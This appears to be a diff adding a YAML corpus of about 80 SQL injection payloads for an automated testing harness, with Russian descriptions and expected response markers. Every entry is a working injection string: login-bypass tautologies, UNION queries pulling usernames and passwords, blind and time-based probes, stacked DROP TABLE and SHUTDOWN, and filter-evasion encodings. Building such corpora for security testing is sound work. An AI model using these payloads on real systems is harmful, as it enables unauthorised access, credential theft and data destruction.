@@ -1,0 +1,864 @@
+# AMHF Payload Corpus — SQL Injection
+# Educational use only. Sources: PortSwigger Web Security Academy,
+# OWASP Testing Guide, PayloadsAllTheThings.
+# Total: 80 payloads.
+
+- id: sqli_taut_001
+  class: sqli
+  payload: ''' OR ''1''=''1'
+  description: Классическая тавтология с одинарной кавычкой
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_002
+  class: sqli
+  payload: '" OR "1"="1'
+  description: Тавтология с двойной кавычкой
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_003
+  class: sqli
+  payload: ''' OR ''1''=''1'' -- -'
+  description: Тавтология + однострочный комментарий MySQL/MSSQL
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_004
+  class: sqli
+  payload: ''' OR ''1''=''1'' /*'
+  description: Тавтология + многострочный комментарий
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_005
+  class: sqli
+  payload: ''' OR 1=1#'
+  description: 'MySQL # как комментарий'
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_006
+  class: sqli
+  payload: admin'--
+  description: Прохождение под admin с обрезкой пароля
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_007
+  class: sqli
+  payload: 'admin'' #'
+  description: Аналогично с MySQL-комментарием
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_008
+  class: sqli
+  payload: admin'/*
+  description: Аналогично с многострочным комментарием
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_009
+  class: sqli
+  payload: ''' OR ''x''=''x'
+  description: Тавтология альтернативная
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_010
+  class: sqli
+  payload: ''' OR 1=1 LIMIT 1 -- -'
+  description: Тавтология + ограничение LIMIT
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: easy
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_011
+  class: sqli
+  payload: ''') OR (''1''=''1'
+  description: Закрывающие скобки для выражения с приведением
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: easy
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_012
+  class: sqli
+  payload: ''')) OR ((''1''=''1'
+  description: Двойные скобки
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: easy
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_013
+  class: sqli
+  payload: ''' OR ''''='''
+  description: Сравнение пустых строк
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: easy
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_014
+  class: sqli
+  payload: ''' OR ''a''=''a'
+  description: Тавтология строковая
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_015
+  class: sqli
+  payload: 1' OR '1'='1
+  description: Числовой контекст с кавычкой
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: easy
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_016
+  class: sqli
+  payload: 1 OR 1=1
+  description: Без кавычек, чисто числовой
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_taut_017
+  class: sqli
+  payload: 1 OR 1=1 -- -
+  description: Числовой + комментарий
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - Surname
+  - admin
+  difficulty: trivial
+  source: PortSwigger SQLi Cheat Sheet
+- id: sqli_union_001
+  class: sqli
+  payload: ''' UNION SELECT NULL-- -'
+  description: UNION с одной NULL-колонкой
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_002
+  class: sqli
+  payload: ''' UNION SELECT NULL,NULL-- -'
+  description: UNION две NULL
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_003
+  class: sqli
+  payload: ''' UNION SELECT NULL,NULL,NULL-- -'
+  description: UNION три NULL
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_004
+  class: sqli
+  payload: ''' UNION SELECT NULL,NULL,NULL,NULL-- -'
+  description: UNION четыре NULL
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_005
+  class: sqli
+  payload: ''' UNION SELECT @@version,NULL-- -'
+  description: Раскрытие версии MySQL/MSSQL
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_006
+  class: sqli
+  payload: ''' UNION SELECT version(),NULL-- -'
+  description: Раскрытие версии MySQL/Postgres
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_007
+  class: sqli
+  payload: ''' UNION SELECT user(),database()-- -'
+  description: Текущий пользователь и БД MySQL
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_008
+  class: sqli
+  payload: ''' UNION SELECT current_user,current_database()-- -'
+  description: Текущий пользователь PostgreSQL
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_009
+  class: sqli
+  payload: ''' UNION SELECT table_name,NULL FROM information_schema.tables-- -'
+  description: Перечисление таблиц
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_010
+  class: sqli
+  payload: ''' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name=''users''-- -'
+  description: Перечисление колонок
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: medium
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_011
+  class: sqli
+  payload: ''' UNION SELECT username,password FROM users-- -'
+  description: Извлечение учётных данных
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: medium
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_012
+  class: sqli
+  payload: ''' UNION ALL SELECT NULL,NULL,NULL-- -'
+  description: UNION ALL вариант
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: easy
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_013
+  class: sqli
+  payload: -1' UNION SELECT 1,2,3-- -
+  description: Принуждение возврата только UNION-строки
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: medium
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_014
+  class: sqli
+  payload: ''' UNION SELECT 0x414d48465f464c41475f31,NULL-- -'
+  description: Hex-литерал для маркера
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: medium
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_union_015
+  class: sqli
+  payload: ''' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -'
+  description: Концатенация таблиц
+  expected_markers:
+  - MariaDB
+  - MySQL
+  - PostgreSQL
+  - AMHF_FLAG_
+  - admin
+  - root@
+  difficulty: medium
+  source: OWASP Testing Guide WSTG-INPV-05
+- id: sqli_blindb_001
+  class: sqli
+  payload: ''' AND 1=1-- -'
+  description: Условно истинное условие
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: easy
+  source: PortSwigger Blind SQLi
+- id: sqli_blindb_002
+  class: sqli
+  payload: ''' AND 1=2-- -'
+  description: Условно ложное условие
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: easy
+  source: PortSwigger Blind SQLi
+- id: sqli_blindb_003
+  class: sqli
+  payload: ''' AND SUBSTRING(version(),1,1)=''5''-- -'
+  description: Извлечение версии посимвольно
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: PortSwigger Blind SQLi
+- id: sqli_blindb_004
+  class: sqli
+  payload: ''' AND ASCII(SUBSTRING(database(),1,1))>64-- -'
+  description: Бинарный поиск ASCII
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: PortSwigger Blind SQLi
+- id: sqli_blindb_005
+  class: sqli
+  payload: ''' AND (SELECT COUNT(*) FROM users)>0-- -'
+  description: Проверка существования таблицы
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: PortSwigger Blind SQLi
+- id: sqli_blindb_006
+  class: sqli
+  payload: ''' AND LENGTH(database())=8-- -'
+  description: Длина имени БД
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: PortSwigger Blind SQLi
+- id: sqli_blindb_007
+  class: sqli
+  payload: ''' OR EXISTS(SELECT 1 FROM users WHERE username=''admin'')-- -'
+  description: Проверка существования записи
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: PortSwigger Blind SQLi
+- id: sqli_blindt_001
+  class: sqli
+  payload: ''' AND SLEEP(2)-- -'
+  description: MySQL SLEEP
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: medium
+  source: PortSwigger Time-based blind SQLi
+- id: sqli_blindt_002
+  class: sqli
+  payload: '''; WAITFOR DELAY ''0:0:2''-- -'
+  description: MSSQL WAITFOR
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: medium
+  source: PortSwigger Time-based blind SQLi
+- id: sqli_blindt_003
+  class: sqli
+  payload: ''' OR pg_sleep(2)-- -'
+  description: PostgreSQL pg_sleep
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: medium
+  source: PortSwigger Time-based blind SQLi
+- id: sqli_blindt_004
+  class: sqli
+  payload: ''' AND BENCHMARK(2000000,MD5(''a''))-- -'
+  description: MySQL BENCHMARK
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: medium
+  source: PortSwigger Time-based blind SQLi
+- id: sqli_blindt_005
+  class: sqli
+  payload: '''||(SELECT pg_sleep(2))||'''
+  description: Postgres конкатенационный
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: medium
+  source: PortSwigger Time-based blind SQLi
+- id: sqli_blindt_006
+  class: sqli
+  payload: ''' OR IF(1=1,SLEEP(2),0)-- -'
+  description: Условный SLEEP
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: medium
+  source: PortSwigger Time-based blind SQLi
+- id: sqli_error_001
+  class: sqli
+  payload: ''' AND extractvalue(1,concat(0x7e,version()))-- -'
+  description: MySQL extractvalue error
+  expected_markers:
+  - You have an error
+  - syntax
+  - PostgreSQL
+  - ORA-
+  - SQLite
+  - MariaDB
+  - XPATH
+  - CONVERT
+  difficulty: medium
+  source: PortSwigger Error-based SQLi
+- id: sqli_error_002
+  class: sqli
+  payload: ''' AND updatexml(1,concat(0x7e,version()),1)-- -'
+  description: MySQL updatexml error
+  expected_markers:
+  - You have an error
+  - syntax
+  - PostgreSQL
+  - ORA-
+  - SQLite
+  - MariaDB
+  - XPATH
+  - CONVERT
+  difficulty: medium
+  source: PortSwigger Error-based SQLi
+- id: sqli_error_003
+  class: sqli
+  payload: ''' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)y)-- -'
+  description: Double-query technique
+  expected_markers:
+  - You have an error
+  - syntax
+  - PostgreSQL
+  - ORA-
+  - SQLite
+  - MariaDB
+  - XPATH
+  - CONVERT
+  difficulty: hard
+  source: PortSwigger Error-based SQLi
+- id: sqli_error_004
+  class: sqli
+  payload: ''' AND CAST((SELECT version()) AS INT)-- -'
+  description: Postgres CAST error
+  expected_markers:
+  - You have an error
+  - syntax
+  - PostgreSQL
+  - ORA-
+  - SQLite
+  - MariaDB
+  - XPATH
+  - CONVERT
+  difficulty: medium
+  source: PortSwigger Error-based SQLi
+- id: sqli_error_005
+  class: sqli
+  payload: ''' AND 1=convert(int,(SELECT @@version))-- -'
+  description: MSSQL CONVERT error
+  expected_markers:
+  - You have an error
+  - syntax
+  - PostgreSQL
+  - ORA-
+  - SQLite
+  - MariaDB
+  - XPATH
+  - CONVERT
+  difficulty: medium
+  source: PortSwigger Error-based SQLi
+- id: sqli_error_006
+  class: sqli
+  payload: ''' AND JSON_EXTRACT(''{}'',''$[0]'')-- -'
+  description: JSON-функция в условии
+  expected_markers:
+  - You have an error
+  - syntax
+  - PostgreSQL
+  - ORA-
+  - SQLite
+  - MariaDB
+  - XPATH
+  - CONVERT
+  difficulty: hard
+  source: PortSwigger Error-based SQLi
+- id: sqli_stack_001
+  class: sqli
+  payload: '''; DROP TABLE temp_test-- -'
+  description: MSSQL/Postgres stacked DDL (sandbox)
+  expected_markers:
+  - __STACKED_OK__
+  difficulty: medium
+  source: OWASP Testing Guide
+- id: sqli_stack_002
+  class: sqli
+  payload: '''; INSERT INTO log VALUES(''amhf'')-- -'
+  description: Stacked INSERT
+  expected_markers:
+  - __STACKED_OK__
+  difficulty: medium
+  source: OWASP Testing Guide
+- id: sqli_stack_003
+  class: sqli
+  payload: '''; SELECT pg_sleep(2)-- -'
+  description: Postgres stacked sleep
+  expected_markers:
+  - __STACKED_OK__
+  difficulty: medium
+  source: OWASP Testing Guide
+- id: sqli_stack_004
+  class: sqli
+  payload: '''; SHUTDOWN-- -'
+  description: MSSQL stacked shutdown (sandbox only)
+  expected_markers:
+  - __STACKED_OK__
+  difficulty: hard
+  source: OWASP Testing Guide
+- id: sqli_bypass_001
+  class: sqli
+  payload: '''/**/OR/**/''1''=''1'
+  description: Inline-комментарии вместо пробелов
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_002
+  class: sqli
+  payload: '''%09OR%091=1-- -'
+  description: Tab вместо пробелов (URL-кодирован)
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_003
+  class: sqli
+  payload: '''+OR+''1''=''1'
+  description: + как пробел
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_004
+  class: sqli
+  payload: '''%0AOR%0A''1''=''1'
+  description: Newline между токенами
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_005
+  class: sqli
+  payload: ''' /*!50000OR*/ ''1''=''1'
+  description: MySQL версионный комментарий
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_006
+  class: sqli
+  payload: ''' OR 1 LIKE 1-- -'
+  description: LIKE вместо =
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_007
+  class: sqli
+  payload: ''' OR 1 BETWEEN 1 AND 2-- -'
+  description: BETWEEN вместо =
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_008
+  class: sqli
+  payload: '''OR''1''=''1'
+  description: Без пробелов вообще
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_009
+  class: sqli
+  payload: '''%a0OR%a01=1-- -'
+  description: Non-breaking space
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_010
+  class: sqli
+  payload: '''/**/UNION/**/SELECT/**/NULL-- -'
+  description: Inline-comments в UNION
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_011
+  class: sqli
+  payload: '''%55NION %53ELECT NULL-- -'
+  description: Частичное URL-кодирование ключевых слов
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_012
+  class: sqli
+  payload: ''' un/**/ion sel/**/ect NULL-- -'
+  description: Фрагментация ключевых слов
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_013
+  class: sqli
+  payload: ''' UnIoN SeLeCt NULL-- -'
+  description: Регистровый микс
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_014
+  class: sqli
+  payload: ''' /*!UNION*/ /*!SELECT*/ NULL-- -'
+  description: Версионные комментарии для каждого слова
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: hard
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_015
+  class: sqli
+  payload: '''%26%26%201=1-- -'
+  description: '&& вместо OR (URL-кодировано)'
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_016
+  class: sqli
+  payload: '''+UNION+ALL+SELECT+NULL,NULL-- -'
+  description: + вместо пробелов в UNION
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_017
+  class: sqli
+  payload: '''/*!12345UNION*/ /*!12345SELECT*/ NULL-- -'
+  description: Версионные с большим номером
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: hard
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_018
+  class: sqli
+  payload: '''%23%0aOR 1=1'
+  description: '# (комментарий) + перенос'
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: medium
+  source: PayloadsAllTheThings SQLi
+- id: sqli_bypass_019
+  class: sqli
+  payload: "'\tOR\t1=1-- -"
+  description: Табуляция как разделитель
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  - admin
+  difficulty: easy
+  source: PayloadsAllTheThings SQLi
+- id: sqli_niche_001
+  class: sqli
+  payload: ''' OR ''a''=''a'' COLLATE utf8mb4_general_ci-- -'
+  description: MySQL COLLATE
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: hard
+  source: Mixed (PortSwigger, OWASP)
+- id: sqli_niche_002
+  class: sqli
+  payload: ''' OR 0x31=0x31-- -'
+  description: Hex-литералы
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: Mixed (PortSwigger, OWASP)
+- id: sqli_niche_003
+  class: sqli
+  payload: ''' OR CHAR(49)=CHAR(49)-- -'
+  description: CHAR()-функция
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: Mixed (PortSwigger, OWASP)
+- id: sqli_niche_004
+  class: sqli
+  payload: ''' OR (SELECT 1)=1-- -'
+  description: Подзапрос в OR
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: easy
+  source: Mixed (PortSwigger, OWASP)
+- id: sqli_niche_005
+  class: sqli
+  payload: '''%00 OR 1=1-- -'
+  description: NULL-байт перед условием
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: Mixed (PortSwigger, OWASP)
+- id: sqli_niche_006
+  class: sqli
+  payload: ''' OR 1=1;%00'
+  description: NULL-байт в конце
+  expected_markers:
+  - AMHF_FLAG_
+  - Welcome
+  difficulty: medium
+  source: Mixed (PortSwigger, OWASP)
